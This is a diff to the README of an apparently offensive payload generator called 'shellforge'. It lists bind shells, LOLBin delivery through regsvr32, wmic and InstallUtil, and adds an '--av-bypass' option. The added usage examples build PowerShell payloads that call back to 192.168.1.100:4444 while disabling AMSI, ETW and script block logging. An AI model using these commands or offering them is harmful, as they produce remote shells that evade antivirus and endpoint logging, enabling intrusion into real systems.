@@ -23,7 +23,7 @@
 
 ## 🔥 Key Features
 
-### �️ Red Team Arsenal
+### 🛡️ Red Team Arsenal
 | Feature | Description |
 | :--- | :--- |
 | **Bind Shells** | Listen on target (Bypass NAT/Firewall) for PHP, Python, Bash, Perl, Ruby, PowerShell |
@@ -48,6 +48,7 @@
 - **Squiblydoo**: SCT scriptlets (`regsvr32`)
 - **WMIC**: XSL stylesheets (`wmic`)
 - **InstallUtil**: .NET binaries (`InstallUtil.exe`)
+- **AV/EDR Levels**: `--av-bypass {amsi|full|max}` (AMSI, AMSI+ETW, full chain)
 
 ### 📦 Massive Extension Support (40+)
 | Category | Extensions |
@@ -102,6 +103,19 @@ shellforge 192.168.1.100 4444 pdf -o report.pdf
 Generate an AMSI-bypassing payload with randomized signatures:
 ```bash
 shellforge 192.168.1.100 4444 ps1 --obfuscate -o bypass.ps1
+```
+
+### 6. AV/EDR Bypass Levels
+Pick how aggressive you want the evasion to be:
+```bash
+# AMSI-only
+shellforge 192.168.1.100 4444 ps1 --av-bypass amsi -o amsi_only.ps1
+
+# AMSI + ETW (recommended)
+shellforge 192.168.1.100 4444 ps1 --av-bypass full -o full_bypass.ps1
+
+# Full chain (AMSI + ETW + script block logging)
+shellforge 192.168.1.100 4444 ps1 --av-bypass max -o max_bypass.ps1
 ```
 
 ---
